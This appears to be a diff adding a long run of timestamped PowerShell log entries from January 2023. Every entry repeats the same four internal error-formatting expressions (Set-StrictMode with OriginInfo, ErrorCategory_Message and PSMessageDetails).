+---
+[2023-01-13 17:33:42.896226Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:42.894868Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:42.889495Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:42.003176Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:42.002108Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:42.000794Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:41.996230Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:41.592613Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:41.591593Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:41.590458Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:41.585948Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:40.733311Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:40.732203Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:40.731066Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:40.726557Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:40.377747Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:40.376733Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:40.375525Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:40.370948Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:39.495214Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:39.494204Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:39.493011Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:39.488306Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:39.140449Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:39.139297Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:39.137969Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:39.133085Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:38.226731Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:38.225671Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:38.224509Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:38.218153Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:37.862922Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:37.861780Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:37.859709Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:37.854927Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:36.962928Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:36.961873Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:36.960737Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:36.956175Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:36.625902Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:36.624823Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:36.623666Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:36.619135Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:35.702194Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:35.701055Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:35.699724Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:35.695062Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:35.351866Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:35.350805Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:35.349579Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:35.344341Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:34.445972Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:34.444963Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:34.443807Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:34.439404Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:34.094942Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:34.093890Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:34.092730Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:34.088202Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:33.201320Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:33.200326Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:33.199171Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:33.194793Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:32.881069Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:32.879670Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:32.863164Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:32.858077Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:31.803836Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:06.544904Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:06.208191Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:06.204002Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:06.202835Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:06.198192Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:05.269936Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:05.268780Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:05.266381Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:05.235652Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:04.887924Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:04.886752Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:04.885356Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:04.880429Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:03.943729Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:03.942639Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:03.941320Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:03.936180Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:03.581530Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:03.580310Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:03.578153Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:03.573293Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:02.659172Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:02.657927Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:02.656307Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:02.651347Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:02.302093Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:02.300953Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:02.299727Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:02.294126Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:01.406098Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:01.404926Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:01.403579Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:01.398708Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:01.036331Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:01.035247Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:01.034048Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:01.028860Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:00.145901Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:00.144664Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:00.140683Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:00.136036Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:59.728857Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:59.727787Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:59.726594Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:59.721919Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:58.757297Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:58.756230Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:58.755004Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:58.749998Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:58.436028Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:58.434962Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:58.433787Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:58.429006Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:57.497648Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:57.496504Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:57.495268Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:57.490448Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:57.100553Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:57.099410Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:57.098193Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:57.093233Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:56.221646Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:56.218947Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:56.217775Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:56.213052Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:55.831697Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:55.830457Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:55.828130Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:55.823334Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:54.895214Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:54.894108Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:54.891579Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:54.886802Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:54.544935Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:54.543862Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:54.542674Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:54.537913Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:53.517175Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:53.515978Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:53.514608Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:53.509825Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:53.149661Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:53.148584Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:53.147433Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:53.142798Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:52.249170Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:52.248090Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:52.246945Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:52.242249Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:51.824062Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:51.823061Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:51.821915Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:51.817362Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:50.921458Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:50.920381Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:50.919240Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:50.914623Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:50.516608Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:50.515422Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:50.514197Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:50.509588Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:49.666344Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:49.665288Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:33:49.664134Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:33:49.659411Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:33:49.296037Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:33:49.294960Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:23.598568Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:23.597331Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:23.595904Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:23.590622Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:23.207888Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:23.206669Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:23.205130Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:23.199756Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:22.355954Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:22.354823Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:22.353548Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:22.348594Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:21.964179Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:21.963069Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:21.961821Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:21.956983Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:21.085562Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:21.084428Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:21.083123Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:21.078038Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:20.718936Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:20.717875Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:20.716748Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:20.712190Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:19.829115Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:19.828017Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:19.826739Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:19.821926Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:19.037468Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:19.036428Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:19.035228Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:19.029063Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:18.123131Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:18.121993Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:18.120763Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:18.115914Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:17.720253Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:17.719156Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:17.717952Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:17.713321Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:16.821765Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:16.820691Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:16.819507Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:16.797176Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:16.394441Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:16.393335Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:16.392135Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:16.387255Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:15.450472Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:15.449164Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:15.447796Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:15.442736Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:15.115830Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:15.114718Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:15.113325Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:15.106166Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:14.226972Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:14.225879Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:14.224670Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:14.219690Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:13.839839Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:13.838767Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:13.837529Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:13.832751Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:12.941428Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:12.940359Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:12.939150Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:12.934143Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:12.592043Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:12.590941Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:12.589720Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:12.585Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:11.656885Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:11.655874Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:11.654682Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:11.649985Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:11.262303Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:11.261053Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:11.259618Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:11.254650Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:10.379738Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:10.378660Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:10.377377Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:10.371538Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:10.008157Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:10.007006Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:10.005581Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:10.000374Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:09.091408Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:09.090301Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:09.089057Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:09.084148Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:08.713470Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:08.712324Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:08.710985Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:08.706215Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:07.843541Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:07.842311Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:07.840964Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:07.832410Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:07.432935Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:07.431869Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:07.430691Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:07.425923Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:06.551826Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:06.550787Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
